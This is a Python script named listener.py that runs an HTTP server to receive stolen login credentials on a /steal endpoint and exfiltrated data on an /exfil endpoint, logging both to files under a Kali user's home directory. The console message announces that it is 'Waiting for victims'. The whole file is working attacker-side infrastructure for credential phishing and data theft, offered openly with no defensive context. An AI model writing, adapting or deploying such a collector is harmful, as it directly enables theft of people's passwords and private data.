                                                                                                                                                                      
#!/usr/bin/env python3
# listener.py - Catches credentials AND exfiltrated data

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import urllib.parse

class StealHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len).decode('utf-8')
            params = dict(x.split('=') for x in post_data.split('&'))
            
            if self.path == '/steal':
                print("\n" + "="*70)
                print(f"[!!!] CREDENTIALS STOLEN at {datetime.now()}")
                print(f"     Username: {params.get('user', 'N/A')}")
                print(f"     Password: {params.get('pass', 'N/A')}")
                print(f"     Source IP: {params.get('ip', 'N/A')}")
                print("="*70 + "\n")
                
                with open('/home/kali/stolen_creds.txt', 'a') as f:
                    f.write(f"{datetime.now()} | Credentials | {params}\n")
                    
            elif self.path == '/exfil':
                data = urllib.parse.unquote(params.get('data', ''))
                user = params.get('user', 'Unknown')
                size = params.get('size', '0')
                
                print("\n" + "="*70)
                print(f"[!!!] DATA EXFILTRATED at {datetime.now()}")
                print(f"     Exfiltrated by: {user}")
                print(f"     Data Size: {size} bytes")
                print(f"     Preview: {data[:500]}...")
                print("="*70 + "\n")
                
                filename = f"/home/kali/exfil_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Data Exfiltrated: {datetime.now()}\n")
                    f.write(f"Exfiltrated by: {user}\n")
                    f.write(f"Size: {size} bytes\n")
                    f.write("="*70 + "\n\n")
                    f.write(data)
                
                print(f"[✓] Full data saved to: {filename}")
                
                with open('/home/kali/exfil_log.txt', 'a') as f:
                    f.write(f"{datetime.now()} | Data Exfil | User: {user} | Size: {size} bytes\n")
            
            try:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except BrokenPipeError:
                pass
                
        except Exception as e:
            print(f"[!] Error: {e}")
            pass

    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), StealHandler)
    print("[*]  LISTENER RUNNING on 0.0.0.0:8080")
    print("[*] Listening for:")
    print("    - Credentials (/steal)")
    print("    - Data Exfiltration (/exfil)")
    print("\n[*] Ready. Waiting for victims...")
    server.serve_forever()



